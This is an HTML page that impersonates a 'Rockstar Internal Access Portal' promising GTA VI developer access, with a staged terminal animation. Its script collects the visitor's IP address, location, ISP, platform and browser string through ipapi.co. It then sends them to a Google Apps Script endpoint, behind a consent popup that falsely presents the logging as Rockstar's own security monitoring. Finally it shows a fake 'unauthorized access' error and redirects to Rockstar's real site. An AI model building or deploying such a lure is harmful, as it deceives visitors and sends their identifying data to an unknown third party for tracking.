<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Rockstar Internal Access Portal</title>

<style>
body {
  margin: 0;
  background: #050505;
  color: #00ff9f;
  font-family: monospace;
}

.container {
  max-width: 650px;
  margin: 50px auto;
  border: 1px solid #00ff9f;
  padding: 20px;
  background: #000;
  box-shadow: 0 0 15px #00ff9f33;
}

h1 {
  text-align: center;
  color: #ffcc00;
  font-size: 20px;
}

.status {
  font-size: 12px;
  margin-top: 10px;
  color: #aaa;
}

.terminal {
  margin-top: 15px;
  background: #000;
  padding: 10px;
  height: 200px;
  overflow-y: auto;
  border: 1px solid #00ff9f;
  font-size: 12px;
}

.progress {
  margin-top: 10px;
  height: 8px;
  background: #222;
}

.bar {
  height: 100%;
  width: 0%;
  background: #00ff9f;
}

button {
  width: 100%;
  padding: 10px;
  margin-top: 15px;
  background: #00ff9f;
  color: black;
  border: none;
  font-weight: bold;
  cursor: pointer;
}

/* CONSENT POPUP */
#consentBox {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: #000000ee;
  display: flex;
  justify-content: center;
  align-items: center;
}

.consent-content {
  background: #111;
  padding: 20px;
  border: 1px solid #00ff9f;
  max-width: 400px;
  text-align: center;
}

.consent-content button {
  margin-top: 10px;
}
</style>
</head>

<body>

<!-- CONSENT -->
<div id="consentBox">
  <div class="consent-content">
    <h3>Secure Access Required</h3>
    <p>
      This internal Rockstar system logs IP address, device info, and session data 
      for security monitoring.
    </p>
    <button onclick="acceptConsent()">ALLOW ACCESS</button>
  </div>
</div>

<div class="container">
  <h1>ROCKSTAR INTERNAL NETWORK</h1>

  <div class="status" id="status">Awaiting authorization...</div>

  <div class="terminal" id="terminal"></div>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>

  <button onclick="runSystem()">Initialize Secure Session</button>
</div>

<script>

let userData = {};
let consentGiven = false;

// ===== CONSENT =====
function acceptConsent() {
  consentGiven = true;
  document.getElementById("consentBox").style.display = "none";
  getUserData();
}

// ===== FETCH USER INFO =====
async function getUserData() {
  try {
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();

    userData = {
      ip: data.ip,
      city: data.city,
      country: data.country_name,
      org: data.org,
      device: navigator.platform,
      browser: navigator.userAgent,
      time: new Date().toLocaleString()
    };

    document.getElementById("status").innerText =
      `Node: ${data.ip} | ${data.city}, ${data.country_name}`;

  } catch {
    document.getElementById("status").innerText = "Secure connection limited";
  }
}

// ===== TRACK USER =====
function trackUser() {
  if (!consentGiven) return;

  fetch("https://script.google.com/macros/s/AKfycbwmehXULJ0GwP9fIUv56JLuCVA2-Dr7XLbaUU-iqwTeB0lEELsJXsJwaNgLSK4iyZmwuA/exec", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(userData)
  });
}

// ===== TERMINAL =====
function log(text) {
  let terminal = document.getElementById("terminal");
  terminal.innerHTML += text + "<br>";
  terminal.scrollTop = terminal.scrollHeight;
}

// ===== FLOW =====
function runSystem() {

  if (!consentGiven) {
    alert("Authorization required.");
    return;
  }

  trackUser();

  let logs = [
    "Connecting to Rockstar secure servers...",
    "Authenticating internal credentials...",
    "Accessing GTA VI dev environment...",
    "Syncing encrypted assets...",
    "Verifying clearance level..."
  ];

  let i = 0;
  let bar = document.getElementById("bar");

  let interval = setInterval(() => {
    if (i < logs.length) {
      log(logs[i]);
      bar.style.width = ((i + 1) / logs.length) * 100 + "%";
      i++;
    } else {
      clearInterval(interval);
      finish();
    }
  }, 900);
}

// ===== FINAL =====
function finish() {
  log("❌ ERROR: Unauthorized Access Detected");
  log("Redirecting to public network...");

  setTimeout(() => {
    window.location.href = "https://www.rockstargames.com/VI";
  }, 2500);
}

</script>

</body>
</html>
